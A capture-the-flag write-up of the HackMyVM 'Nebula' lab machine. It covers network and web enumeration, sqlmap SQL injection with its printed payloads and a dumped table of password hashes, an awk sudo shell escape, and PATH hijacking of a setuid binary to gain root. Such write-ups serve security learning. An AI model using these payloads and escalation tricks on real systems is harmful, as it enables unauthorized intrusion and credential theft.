# Nevula Writeup HackMyVM

![Nebula](https://github.com/0xsynix/Writeups/blob/main/assets/HackMyVM/Nebula/nebula.png)

<strong> Nebula is an easy difficulty Linux machine from HackMyVM platfrom! </strong> <a href="https://hackmyvm.eu/machines/machine.php?vm=Nebula">VM Link</a>
<br>

## Enumeration 
#### >> Find the IP address of our Target in our virtual network, with `netdiscover`
```shell
Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                        
                                                                                                                                                                      
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 102                                                                                                      
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.209.4   08:00:27:d1:3d:c7      1      60  PCS Systemtechnik GmbH                                                                                             
 192.168.209.80  da:a4:26:53:14:8d      1      42  Unknown vendor
```
- Our target ip is `192.168.209.4`

#### >> Scan for open Ports and services with nmap
```shell
──(synix㉿zer0day)-[~]
└─$ sudo nmap -sC -sV 192.168.209.4  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 12:26 IST
Nmap scan report for 192.168.209.4
Host is up (0.00027s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 63:9c:2e:57:91:af:1e:2e:25:ba:55:fd:ba:48:a8:60 (RSA)
|   256 d0:05:24:1d:a8:99:0e:d6:d1:e5:c5:5b:40:6a:b9:f9 (ECDSA)
|_  256 d8:4a:b8:86:9d:66:6d:7f:a4:cb:d0:73:a1:f4:b5:19 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Nebula Lexus Labs
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 08:00:27:D1:3D:C7 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.80 seconds
```
- A web server on port 80
- By visiting the browser we get page like this!
<br>

![ALT Text](https://github.com/0xsynix/Writeups/blob/main/assets/HackMyVM/Nebula/1.png)
<br>

#### >> Brute Force files and subdirectories with `gobuster`
```shell
┌──(synix㉿zer0day)-[~]
└─$ gobuster dir -u http://192.168.209.4 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.209.4
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 312] [--> http://192.168.209.4/img/]
/login                (Status: 301) [Size: 314] [--> http://192.168.209.4/login/]
/joinus               (Status: 301) [Size: 315] [--> http://192.168.209.4/joinus/]
/server-status        (Status: 403) [Size: 278]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```
- `/login` and `joinus` looks intresting
- `/joinus` gives us access to a PDF to join. In pdf there is this information.
<br>

![ALT Image](https://github.com/0xsynix/Writeups/blob/main/assets/HackMyVM/Nebula/2.png)

- With username & password we can log in to `/login`
-  `admin:d46df8e6a5627debf930f7b5c8f3b083`
-  And we got access to dashboard! there is some functionality for search centrals & meeting room
<br>

![ALT Image](https://github.com/0xsynix/Writeups/blob/main/assets/HackMyVM/Nebula/3.png)

- Url looks vulnerable to SQL Injection
- Let's Try running `sqlmap`

```shell
┌──(synix㉿zer0day)-[~]
└─$ sqlmap -v --batch --dbs -u 192.168.209.4/login/search_central.php?id=2
        ___
       H
 ___ ___[,]_____ ___ ___  {1.8.8#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:24:36 /2024-09-02/

[11:24:36] [INFO] resuming back-end DBMS 'mysql' 
[11:24:36] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2' AND 8387=8387 AND 'Bfsj'='Bfsj

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=2' AND (SELECT 6699 FROM (SELECT(SLEEP(5)))wecl) AND 'FjsV'='FjsV

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=2' UNION ALL SELECT CONCAT(0x71786a7071,0x787a4b6c6d6842516a4e6961534d54744d6572486d6766716f7772564978626b436b4864476d6846,0x717a706a71),NULL,NULL-- -
---
[11:24:36] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:24:36] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] nebuladb

[11:24:36] [INFO] fetched data logged to text files under '/home/synix/.local/share/sqlmap/output/192.168.209.4'

[*] ending @ 11:24:36 /2024-09-02/
```
- Got database called `nebuladb`, lets try to dump

```shell
[11:25:24] [INFO] table 'nebuladb.centrals' dumped to CSV file '/home/synix/.local/share/sqlmap/output/192.168.209.4/dump/nebuladb/centrals.csv'
[11:25:24] [INFO] fetching columns for table 'users' in database 'nebuladb'
[11:25:24] [INFO] fetching entries for table 'users' in database 'nebuladb'
[11:25:24] [INFO] recognized possible password hashes in column 'password'
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[11:25:24] [INFO] using hash method 'md5_generic_passwd'
[11:25:24] [INFO] resuming password '999999999' for hash 'c8c605999f3d8352d7bb792cf3fdb25b' for user 'pmccentral'
[11:25:24] [INFO] starting dictionary-based cracking (md5_generic_passwd)
Database: nebuladb                                                                                                                                                    
Table: users
[7 entries]
+----+----------+----------------------------------------------+-------------+
| id | is_admin | password                                     | username    |
+----+----------+----------------------------------------------+-------------+
| 1  | 1        | d46df8e6a5627debf930f7b5c8f3b083             | admin       |
| 2  | 0        | c8c605999f3d8352d7bb792cf3fdb25b (999999999) | pmccentral  |
| 3  | 0        | 5f823f1ac7c9767c8d1efbf44158e0ea             | Frederick   |
| 3  | 0        | 4c6dda8a9d149332541e577b53e2a3ea             | Samuel      |
| 5  | 0        | 41ae0e6fbe90c08a63217fc964b12903             | Mary        |
| 6  | 0        | 5d8cdc88039d5fc021880f9af4f7c5c3             | hecolivares |
| 7  | 1        | c8c605999f3d8352d7bb792cf3fdb25b (999999999) | pmccentral  |
+----+----------+----------------------------------------------+-------------+

[11:25:34] [INFO] table 'nebuladb.users' dumped to CSV file '/home/synix/.local/share/sqlmap/output/192.168.209.4/dump/nebuladb/users.csv'
[11:25:34] [INFO] fetching columns for table 'central' in database 'nebuladb'
[11:25:34] [INFO] fetching entries for table 'central' in database 'nebuladb'
[11:25:34] [INFO] recognized possible password hashes in column 'password'
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[11:25:34] [INFO] using hash method 'md5_generic_passwd'
[11:25:34] [INFO] resuming password '999999999' for hash 'c8c605999f3d8352d7bb792cf3fdb25b' for user 'pmccentral'
[11:25:34] [INFO] starting dictionary-based cracking (md5_generic_passwd)
Database: nebuladb                                                                                                                                                    
Table: central
[2 entries]
+----+--------------+----------------------------------------------+-------------+
| id | role         | password                                     | username    |
+----+--------------+----------------------------------------------+-------------+
| 1  | Security     | c8c605999f3d8352d7bb792cf3fdb25b (999999999) | pmccentral  |
| 2  | Experiment 1 | 6dd0ec0f2c1588fcff2b4cf6b4eca72e             | experiment1 |
+----+--------------+----------------------------------------------+-------------+

[11:25:43] [INFO] table 'nebuladb.central' dumped to CSV file '/home/synix/.local/share/sqlmap/output/192.168.209.4/dump/nebuladb/central.csv'
[11:25:43] [INFO] fetched data logged to text files under '/home/synix/.local/share/sqlmap/output/192.168.209.4'

[*] ending @ 11:25:43 /2024-09-02/
```
- Got Many juice stuff!!!
- On the dashboard its mentioned, if you are from PMC central log in with SSH.
- So, log in ssh with `pmccentral:999999999` (password got from the dump)
<br>

## Exploitation

```shell
┌──(synix㉿zer0day)-[~]
└─$ ssh pmccentral@192.168.209.4 
pmccentral@192.168.209.4's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-169-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 02 Sep 2024 07:29:27 AM UTC

  System load:             0.24
  Usage of /:              35.5% of 9.75GB
  Memory usage:            22%
  Swap usage:              0%
  Processes:               139
  Users logged in:         1
  IPv4 address for enp0s3: 192.168.209.4
  IPv6 address for enp0s3: 2402:3a80:4421:87c5:a00:27ff:fed1:3dc7
  IPv6 address for enp0s3: 2402:3a80:4411:442c:a00:27ff:fed1:3dc7

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

2 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
New release '22.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Mon Sep  2 06:01:49 2024 from 192.168.209.112
pmccentral@laboratoryuser:~$ ls
desktop  documents  downloads
pmccentral@laboratoryuser:~$ id
uid=1001(pmccentral) gid=1001(pmccentral) groups=1001(pmccentral)
pmccentral@laboratoryuser:~$
```

- By roaming around found out that there is two user `pmclaboratoryadmin` & `pmccentral`

```shell
  pmccentral@laboratoryuser:/home$ sudo -l
[sudo] password for pmccentral: 
Matching Defaults entries for pmccentral on laboratoryuser:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pmccentral may run the following commands on laboratoryuser:
    (laboratoryadmin) /usr/bin/awk
  ```
- We can run /usr/bin/awk as a laboratoryadmin
- Let's Exploer <a href="https://gtfobins.github.io/gtfobins/awk/"> GTFObins </a> to that with awk beign able to execute sudo 


```shell
sudo awk 'BEGIN {system("/bin/sh")}'
```

- lets run this command as user laboratoryadmin

```shell
pmccentral@laboratoryuser:/home$ sudo -u laboratoryadmin awk 'BEGIN {system("/bin/bash")}'
laboratoryadmin@laboratoryuser:/home$ id
uid=1002(laboratoryadmin) gid=1002(laboratoryadmin) groups=1002(laboratoryadmin)
laboratoryadmin@laboratoryuser:/home$ whoami
laboratoryadmin
laboratoryadmin@laboratoryuser:/home$
```
- And BOOM we got access to laboratoryadmin

```shell
laboratoryadmin@laboratoryuser:/home$ cd laboratoryadmin/
laboratoryadmin@laboratoryuser:~$ ls -la
total 52
drwx------ 8 laboratoryadmin laboratoryadmin 4096 Dec 18  2023 .
drwxr-xr-x 4 root            root            4096 Dec 17  2023 ..
drwxr-xr-x 2 laboratoryadmin laboratoryadmin 4096 Dec 18  2023 autoScripts
-rw------- 1 laboratoryadmin laboratoryadmin   74 Dec 18  2023 .bash_history
-rw-r--r-- 1 laboratoryadmin laboratoryadmin  220 Dec 17  2023 .bash_logout
-rw-r--r-- 1 laboratoryadmin laboratoryadmin 3771 Dec 17  2023 .bashrc
drwxr-xr-x 2 laboratoryadmin laboratoryadmin 4096 Dec 17  2023 desktop
drwxr-xr-x 2 laboratoryadmin laboratoryadmin 4096 Dec 17  2023 documents
drwxr-xr-x 2 laboratoryadmin laboratoryadmin 4096 Dec 17  2023 downloads
drwxr-xr-x 2 laboratoryadmin laboratoryadmin 4096 Dec 17  2023 home
drwxrwxr-x 3 laboratoryadmin laboratoryadmin 4096 Dec 17  2023 .local
-rw-r--r-- 1 laboratoryadmin laboratoryadmin  807 Dec 17  2023 .profile
-rw-r--r-- 1 laboratoryadmin laboratoryadmin   33 Dec 18  2023 user.txt
laboratoryadmin@laboratoryuser:~$
```
- And we got the user flag!!! 👾
<br>

## Privilege escalation

- Also we have directory named autoScripts and it has two file called `head` and `PMCEmployees`
- `PMCEmployees` looks some kind of script contains binary code!
- Lets look for strings of the `PMCEmployees` with `strings` command

```shell
laboratoryadmin@laboratoryuser:~/autoScripts$ strings PMCEmployees 
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
printf
system
cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Showing top 10 best employees of PMC company
head /home/pmccentral/documents/employees.txt
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
crtstuff.c
deregister_tm_clones
do_global_dtors_aux
completed.8061
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
PMCEmployees.c
__FRAME_END
init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start
dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

- Look closely we got something : Showing top 10 best employees of PMC company head /home/pmccentral/documents/employees.txt
- The program or script runs as root, calls the `head` program, which is usually in `/usr/bin/head`.
- In `/home/laboratoryadmin/autoScripts` we have `head` file which executes `bash -p` command.
- Let's add this path to a $PATH.
  
```shell
laboratoryadmin@laboratoryuser:~/autoScripts$ export PATH=/home/laboratoryadmin/autoScripts:$PATH
```
- Now if we run PMCEmployee we'll have a root shell.

```shell
laboratoryadmin@laboratoryuser:~/autoScripts$ ./PMCEmployees 
root@laboratoryuser:~/autoScripts# id
uid=0(root) gid=1002(laboratoryadmin) groups=1002(laboratoryadmin)
root@laboratoryuser:~/autoScripts# whoami
root
root@laboratoryuser:~/autoScripts# cd /root/
root@laboratoryuser:/root# ls -la
total 44
drwx------  5 root root 4096 Dec 18  2023 .
drwxr-xr-x 19 root root 4096 Dec 16  2023 ..
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4096 Dec 16  2023 .local
-rw-------  1 root root 2959 Dec 17  2023 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-------  1 root root    7 Dec 17  2023 .python_history
-rw-r--r--  1 root root   17 Dec 18  2023 root.txt
drwx------  3 root root 4096 Dec 16  2023 snap
drwx------  2 root root 4096 Dec 16  2023 .ssh
-rw-r--r--  1 root root  176 Dec 17  2023 .wget-hsts
root@laboratoryuser:/root#
```

- And Finally We have the ROOT Flag!! 🚨
